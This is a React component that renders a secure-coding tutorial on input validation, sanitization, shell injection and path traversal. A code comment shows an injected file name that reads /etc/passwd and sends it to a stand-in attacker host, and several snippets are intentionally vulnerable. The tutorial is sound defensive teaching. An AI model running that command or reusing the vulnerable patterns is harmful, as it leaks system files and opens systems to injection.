import Syntax from "../../../components/SyntaxHighlighter";

export default function ValidationSanitization() {
  return (
    <div>
      <h2>Validation and Sanitization</h2>
      <p>
        Validation checks that input is what the application expects; sanitization transforms input
        into something safe to use. Validation rejects, sanitization rewrites. Both are the front
        line against every injection type.
      </p>

      <h3>Prefer Allow-lists</h3>
      <p>
        A block-list asks "what is dangerous?" and always lags behind attackers. An allow-list asks
        "what is acceptable?" and fails closed when something unexpected arrives.
      </p>
      <Syntax
        language="typescript"
        code={`// Block-list: fragile, easy to bypass
const banned = [";", "|", "$", "--"];
if (banned.some((c) => input.includes(c))) throw new Error("bad input");

// Allow-list: strict, predictable
if (!/^[a-z0-9-]{1,64}$/.test(input)) throw new Error("bad input");`}
      />

      <h3>Validate at the Boundary</h3>
      <p>
        Validate the moment untrusted data enters the system, before any use. A schema library such
        as Zod gives both runtime validation and TypeScript types from a single definition:
      </p>
      <Syntax
        language="typescript"
        code={`import { Request, Response, NextFunction } from "express";
import { z } from "zod";

const RegisterSchema = z.object({
  username: z.string().min(3).max(32).regex(/^[a-zA-Z0-9_-]+$/),
  email: z.string().email().max(254),
  age: z.number().int().min(13).max(120),
  role: z.enum(["user", "editor"]), // attacker cannot escalate to "admin"
});

function validate(schema: z.ZodTypeAny) {
  return (req: Request, res: Response, next: NextFunction) => {
    const result = schema.safeParse(req.body);
    if (!result.success) {
      return res.status(400).json({ error: result.error.flatten() });
    }
    res.locals.data = result.data; // use the parsed value, not req.body
    next();
  };
}

app.post("/register", validate(RegisterSchema), async (req, res) => {
  const { username, email, age, role } = res.locals.data;
  await createUser({ username, email, age, role });
  res.status(201).send("Created");
});`}
      />

      <h3>Sanitize for the Target Context</h3>
      <p>
        There is no universal "safe" string. Sanitization depends on where the data goes: HTML, SQL,
        shell, URL, or file paths. Escape for the context, at the point of use.
      </p>
      <ul>
        <li>
          <strong>HTML output</strong> - escape with a library such as
          <code> he</code> or render text nodes, never <code>dangerouslySetInnerHTML</code>
        </li>
        <li>
          <strong>SQL</strong> - use parameterized queries instead of escaping
        </li>
        <li>
          <strong>Shell</strong> - avoid <code>exec</code> with strings; use <code>execFile</code>/
          <code>spawn</code> with argument arrays
        </li>
        <li>
          <strong>File paths</strong> - resolve and compare against a base directory
        </li>
      </ul>
      <Syntax
        language="typescript"
        code={`import { execFile } from "node:child_process";
import path from "node:path";

// VULNERABLE: input is part of the shell string
exec(\`convert \${file} -resize 100x100 out.png\`);
// file: "a.png; curl attacker.example/$(cat /etc/passwd)"

// SAFE: arguments are passed as an array, never through a shell
execFile("convert", [file, "-resize", "100x100", "out.png"]);

// VULNERABLE: user-controlled path
const filePath = path.join("uploads", req.body.filename);

// SAFE: resolve and verify the path stays inside the base directory
const baseDir = path.resolve("uploads");
const filePath = path.resolve(baseDir, req.body.filename);
if (!filePath.startsWith(baseDir + path.sep)) {
  throw new Error("Path traversal blocked");
}`}
      />

      <h3>Validation Is Not Sanitization</h3>
      <p>
        An email like <code>a@b.com</code> can be valid for storage and still dangerous in an SQL or
        HTML context. Passing validation does not remove the need for context-aware escaping or
        parameterization downstream.
      </p>

      <h3>Rules of Thumb</h3>
      <ul>
        <li>Validate everything that crosses a trust boundary</li>
        <li>Expect data, not code: reject anything shaped like markup or SQL</li>
        <li>Use the parsed, validated value, never the raw request body</li>
        <li>Canonicalize first (decode, normalize), then validate</li>
        <li>Server-side validation is mandatory; client-side is UX only</li>
      </ul>
    </div>
  );
}
